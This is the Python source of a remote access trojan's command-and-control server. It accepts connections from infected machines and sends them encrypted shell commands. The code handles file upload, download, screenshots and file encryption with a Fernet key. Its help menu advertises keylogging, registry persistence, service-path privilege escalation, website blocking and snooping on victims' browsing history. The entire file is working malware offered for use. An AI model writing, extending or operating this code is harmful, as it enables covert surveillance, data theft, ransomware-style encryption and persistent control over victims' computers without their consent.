import socket
import json
import time
import os
from Crypto.Util.Padding import pad ,unpad
from config import *
from Crypto.Cipher import AES
import base64
import threading
global key

RED = '\033[91m'
RESET = '\033[0m'
GREEN = '\033[92m'

global keylog
keylog = False

print("checking connection encryption key.....")
if len(skey) != 32 or len(siv) != 16:
    print(RED + "ERROR! the AES encryption key must be 256 bits and the IV must be 128bits" + RESET)
    time.sleep(5)
    exit()
else:
    print(GREEN + "Valid" + RESET)

key = generate()
print("""



██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░██████╗░
██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗╚════██╗
██████╔╝██║░░██║██║░░░░░░╚████╔╝░██║░░╚═╝░░███╔═╝
██╔═══╝░██║░░██║██║░░░░░░░╚██╔╝░░██║░░██╗██╔══╝░░
██║░░░░░╚█████╔╝███████╗░░░██║░░░╚█████╔╝███████╗

-made by polyester""")

def main():
    os.system("cls")
    print(welcome)
    print(GREEN + '[+] Waiting For The Incoming Connections ...' + RESET)
    while True:
        command = input('[😊] Command & Control Center: ')
        match command:
            case 'list_sessions':
                counter = 0
                if ips == []:
                    print("no session")
                else:
                    for ip in ips:
                        print('Session ' + str(counter) + ' --- ' + str(ip).split(",")[0].replace("(", ""))
                        counter += 1
            case "list":
                if ips == []:
                    print("no ip connected")
                else:
                    print(ips)
            case "powershell":
                pass
            case str() if command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except Exception as e:
                    print(e)
            case str() if command[:7] == 'session':
                try:
                    num = int(command[8:])
                    tarnum = targets[num]
                    tarip = ips[num]
                    target_communication(target=tarnum, ip=tarip)
                except socket.error as e:
                    if e.errno == 10054:
                        print(RED + "target terminated the connection" + RESET)
                        print(RED + "returning to C2..." + RESET)
                        try:
                            targets.remove(tarnum)
                            ips.remove(tarip)
                        except Exception as e:
                            print(e)
                    else:
                        print(RED + f"socket error: {e}" + RESET)
                except:
                    print("No session ID found")
            case "exit" | "quit":
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                exit()
            case str() if command[:4] == 'kill':
                try:
                    targ = targets[int(command[5:])]
                    ip = ips[int(command[5:])]
                    reliable_send(targ, 'quit')
                    targ.close()
                    targets.remove(targ)
                    ips.remove(ip)
                    print("session killed")
                except:
                    print("Failed")
            case str() if command[:7] == 'sendall':
                x = len(targets)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        reliable_send(tarnumber, command[8:])
                        i += 1
                except:
                    print('Failed')
            case "help":
                print("""
    list                ---> list the ip connected
    session             ---> connect to a session
    kill                ---> kill a session
    sendall             ---> send the command to all ips
    list_sessions       ---> list sessions
    exit                ---> quit the C2 server
    """)
            case "":
                pass
            case _:
                os.system(command)

def reliable_send(target, data):
    data = base64.b64encode(encryptcon(data.encode("utf-8"))).decode("utf-8")
    sjson = json.dumps(data)
    target.send(sjson.encode())

def encryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    padded = pad(message, AES.block_size)
    return aes.encrypt(padded)

def decryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    decrypt = aes.decrypt(message)
    unpadded = unpad(decrypt, AES.block_size)
    return(unpadded)

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(8096).decode().rstrip()
            return (decryptcon(base64.b64decode(json.loads(data)))).decode('utf-8')
        except ValueError:
            continue

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(8096)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(8096)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def start_stream(target, server):
    try:
        server.start_server()
        print("server started, waiting for connection.....")
        result = reliable_recv(target)
        print(result)
    except:
        reliable_send(target, "client streaming stopped")


def target_communication(target, ip):
    print(connection)
    print("\n\n you have connected!! have fun😉\n\n\n")
    count = 0
    while True:
        command = input('[😈]Shell~%s: ' % str(ip))
        reliable_send(target, command)
        match command:
            case 'quit':
                print("exiting everything including C2")
                exit()
            case str() if command[:3] == 'cd ':
                pass
            case "clear" | "cls":
                pass
            case str() if command[:6] == 'upload':
                try:
                    upload_file(target, command[7:])
                except:
                    print("failed to upload file")
            case str() if command[:8] == 'download':
                try:
                    download_file(target, command[9:])
                except:
                    print("failed to download file")
            case str() if command[:10] == 'screenshot':
                f = open('screenshot%d.png' % (count), 'wb')
                target.settimeout(5)
                chunk = target.recv(8096)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = target.recv(8096)
                    except socket.timeout:
                        break
                target.settimeout(None)
                f.close()
                print("screenshot saved as screenshot%d.png" % count)
                count += 1
                continue
            case 'encrypt':
                print("the fernet key is {}".format(key.decode('utf-8')))
                reliable_send(target, key.decode('utf-8'))
                filedirectory = input("Enter file path: ")
                if filedirectory == "exit":
                    print("exiting...")
                    target_communication()
                else:
                    reliable_send(target, filedirectory)
                    result = reliable_recv(target)
                    print(result)
            case "decrypt":
                print(("the fernet key is {}".format(key.decode('utf-8'))))
                reliable_send(target, key.decode('utf-8'))
                filedirectory = input("Enter encrypted file path: ")
                if filedirectory == "exit":
                    print("exiting...")
                    target_communication()
                else:
                    reliable_send(target, filedirectory)
                    result = reliable_recv(target)
                    print(result)
            case "getinfo":
                result = reliable_recv(target)
                print(result)
            case "weakservice":
                print("scanning......")
                result = reliable_recv(target)
                print(result)
                if "No vulnerable service path detected" in result:
                    pass
                else:
                    print("the following vulnerable services binPath have been changed to C:\Temps\Program.exe")
            case "background":
                print(delconnection)
                input("\n\n backgrounded the connection \n\n\n press enter to return back to C2......")
                os.system("cls")
                main()
            case 'help':
                print(GREEN + '''
                        :GENERAL COMMANDS:
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd <Directory Name>                 --> Changes Directory On Target System
            upload <file name>                  --> Upload File To The target Machine
            download <file name>                --> Download File From Target Machine
            quit                                --> terminate the connection between the listener and the client
            background                          --> background the connection
            clip_copy                           --> copies clipboard content
            display <url>                       --> display an url image


                         :KEYLOGGER:
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File

                        :PERSISTENCE:
            persistence <RegName> <fileName>    --> Create Persistence In Registry


                        :Enumeration:
            getinfo                             --> gets system information
            checkpriv                           --> check admin privilege
            screenshot                          --> get target screenshot

                        :Encryption:
            encrypt                            --> encrypt a single file
            decrypt                            --> decrypt a single file

                        :Internet control:
            blocksite                          --> blocks all website
            unblocksite                        --> unblock all website

                        :PRIVILEGE ESCALATION:
            weakservice                        --> checks for weak service path vulnerability and changes the binPath
            check_elevated                     --> checks for Always install elevated Vulnerability

                           :FUN:
            checkporn                           --> check the PC for visited porn websites using dns

        
            ''' + RESET) 
            case _:
                result = reliable_recv(target)
                print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(GREEN + str(ip).split(",")[0].replace("(", "") + ' has connected!' + RESET)
        except:
            pass

input("\n\npress enter to continue....")
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((lhost, lport))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
main()
